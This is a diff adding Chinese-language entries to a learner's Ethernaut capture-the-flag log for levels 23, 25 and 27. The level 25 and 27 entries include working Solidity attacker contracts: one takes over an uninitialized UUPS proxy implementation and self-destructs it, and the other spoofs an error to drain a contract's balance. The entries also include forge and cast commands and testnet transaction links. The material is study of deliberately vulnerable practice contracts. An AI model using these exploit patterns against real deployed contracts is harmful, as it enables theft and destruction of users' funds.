@@ -953,4 +953,123 @@ forge script script/Level20.s.sol:CallContractScript --rpc-url sepolia --broadca
 脚本还在测试中...
 
 
+### 2024.09.20
+
+[The Ethernaut level 23](https://ethernaut.openzeppelin.com/level/23)
+
+这一关的目的是把 DexTwo 中 token1 和 token2 的余额都提取出来。
+
+仔细阅读合约，该合约是前一关卡 Dex 的微调版本。`swap` 函数去掉了 `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");` 限制。这意味可以使用一个任意的 from 代币，从合约中中获得真正的"to"代币。
+
+
+脚本还在测试中...
+
+
+### 2024.09.21
+
+[The Ethernaut level 25](https://ethernaut.openzeppelin.com/level/25)
+
+这一关的目的是对实现 `Engine` 合约调用 `selfdestruct()`，使 `Engine` 合约无法使用。
+
+仔细阅读合约，这是一个使用 `UUPS` 的模式的代理合约。`Motorbike` 是代理合约，而 `Engine` 是实现合约。
+
+`Engine` 合约代码中没有定义 `selfdestruct()`。那么将如何调用它呢？可以尝试升级实现合约，使其指向自己部署的攻击者合约。
+
+为了升级逻辑，我们需要确保我们是 `upgrader`。
+
+这里需要注意的是，在这个实现中，`initialize()` 函数应该由代理合约调用。但它是通过 `delegatecall()` 来实现的。这意味着是在代理合约的上下文中进行的，而不是在实现中。
+
+在实现合约的上下文中，这尚未被调用。因此，如果直接调用这个函数，调用者（攻击合约）将成为升级者。
+
+一旦我们成为了upgrader，我们可以直接调用 `upgradeToAndCall()`，并把实现合约更改为自己部署的带有 `selfdestruct` 的攻击合约
+
+攻击者合约：
+```
+contract Attacker {
+    Motorbike motorbike;
+    Engine engine;
+    Destructive destructive;
+
+    constructor(address motorbikeAddr, address engineAddr) public {
+        motorbike = Motorbike(payable(motorbikeAddr));
+        engine = Engine(engineAddr);
+        destructive = new Destructive();
+    }
+
+    function attack() external {
+        engine.initialize();
+        bytes memory encodedData = abi.encodeWithSignature("killed()");
+        engine.upgradeToAndCall(address(destructive), encodedData);
+    }
+}
+```
+
+执行脚本：
+```
+forge script script/Level25.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level25.s.sol)
+
+
+链上记录：
+- [level(`Motorbike`)](https://sepolia.etherscan.io/address/0x082198127b7d7adf8D3f035599F15D78C1C0f665)
+- [Attacker](https://sepolia.etherscan.io/address/0x20f8B2087Ba547c69c78B02A9251bFc543FdA9fe)
+- [attack 交易](https://sepolia.etherscan.io/tx/0x262064fcd168e0afc9fb60166a271747ffc37204f38b103140564dba72a1e419)
+- [新 Engine 合约（带自毁功能）](https://sepolia.etherscan.io/address/0x04611f42fbab6cd8028a498e9c825e00bd556dd0)
+
+
+### 2024.09.22
+
+[The Ethernaut level 27](https://ethernaut.openzeppelin.com/level/27)
+
+这一关的目的取出 `GoodSamaritan` 所有余额。
+
+这一关比较简单，只需要攻击合约实现 `INotifyable` 接口，在 `notify` 回调函数中抛出 `NotEnoughBalance()` 错误即可骗过 `Wallet` 合约，使其认为余额不足，进而发送所有“剩余”余额。
+
+攻击者合约：
+```
+contract Attacker is INotifyable {
+    GoodSamaritan level;
+
+    error NotEnoughBalance();
+
+    constructor(address level_) public {
+        level = GoodSamaritan(level_);
+    }
+
+    function attack() external {
+        level.requestDonation();
+    }
+
+    function notify(uint256 amount) external {
+        if (amount <= 10) revert NotEnoughBalance();
+    }
+}
+```
+
+执行脚本：
+```
+forge script script/Level27.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level27.s.sol)
+
+查询攻击合约余额，返回 1000000([1e6])
+```
+cast call \
+0xE58b63c367997C933557B4404e77F9A911A25bcF \
+"balances(address)(uint256)" 0x89111a221475E3D0A5e48Cc501630637993Acce0 \
+--rpc-url sepolia
+```
+
+链上记录：
+- [level(`GoodSamaritan`)](https://sepolia.etherscan.io/address/0x28AF65c81B2a3EfaD0Af0ce2A019Fd6fc1604D24)
+- [level(`Wallet`)](https://sepolia.etherscan.io/address/0xad8cF598BCfDb7465a5df16056ffc675b1B6ACAB)
+- [level(`Coin`)](https://sepolia.etherscan.io/address/0xE58b63c367997C933557B4404e77F9A911A25bcF)
+- [Attacker](https://sepolia.etherscan.io/address/0x89111a221475E3D0A5e48Cc501630637993Acce0)
+- [attack 交易](https://sepolia.etherscan.io/tx/0x433d9650d7a05b0689973825f6eae03d112a20876824b846677f36ce1fe5b0e9)
+
+
+
 <!-- Content_END -->
